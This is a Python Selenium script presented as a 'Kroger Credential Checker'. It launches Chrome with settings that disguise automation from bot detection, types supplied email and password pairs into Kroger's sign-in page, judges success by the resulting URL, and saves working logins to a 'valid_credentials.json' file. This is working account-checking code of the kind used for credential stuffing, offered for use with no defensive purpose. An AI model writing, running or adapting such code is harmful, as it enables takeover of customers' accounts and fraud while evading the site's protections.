from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import time
import logging
import json

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('kroger_checker.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class KrogerChecker:
    def __init__(self):
        self.driver = None
        self.valid_creds = []
        self.invalid_creds = []
        
    def init_browser(self):
        """Initialize Chrome browser with anti-bot evasion settings"""
        chrome_options = Options()
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_argument("--start-maximized")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        self.driver = webdriver.Chrome(options=chrome_options)
        self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
    def check_credentials(self, email: str, password: str):
        """Check credentials using browser automation"""
        try:
            self.init_browser()
            logger.info(f"Checking credentials for: {email}")
            
            # Load login page
            self.driver.get("https://www.kroger.com/signin")
            time.sleep(2)  # Wait for page load
            
            # Fill email
            email_field = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.ID, "email"))
            )
            email_field.send_keys(email)
            
            # Fill password
            password_field = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.ID, "password"))
            )
            password_field.send_keys(password)
            
            # Click sign in
            signin_button = WebDriverWait(self.driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "button[data-qa='signin-button']"))
            )
            signin_button.click()
            
            # Check for successful login
            try:
                WebDriverWait(self.driver, 10).until(
                    EC.url_contains("account")
                )
                logger.info(f"VALID CREDENTIALS: {email}")
                return True
            except:
                logger.info(f"INVALID CREDENTIALS: {email}")
                return False
                
        except Exception as e:
            logger.error(f"Error during checking: {str(e)}")
            return False
        finally:
            if self.driver:
                self.driver.quit()
                
    def check_single(self, email: str, password: str):
        """Check single credential pair"""
        is_valid = self.check_credentials(email, password)
        result = {
            'email': email,
            'password': password,
            'valid': is_valid
        }
        
        if is_valid:
            self.valid_creds.append(result)
        else:
            self.invalid_creds.append(result)
            
        return result
        
    def save_results(self):
        """Save results to JSON files"""
        with open('valid_credentials.json', 'w') as f:
            json.dump(self.valid_creds, f, indent=2)
            
        with open('invalid_credentials.json', 'w') as f:
            json.dump(self.invalid_creds, f, indent=2)
            
        logger.info(f"Saved {len(self.valid_creds)} valid and {len(self.invalid_creds)} invalid credentials")

def main():
    print("Kroger Credential Checker (Browser Version)")
    print("==========================================")
    
    email = input("Email: ")
    password = input("Password: ")
    
    checker = KrogerChecker()
    result = checker.check_single(email, password)
    
    print("\nResult:")
    print(json.dumps(result, indent=2))
    
    checker.save_results()

if __name__ == '__main__':
    logger.info("Starting Kroger Browser Checker")
    main()
    logger.info("Checker execution completed")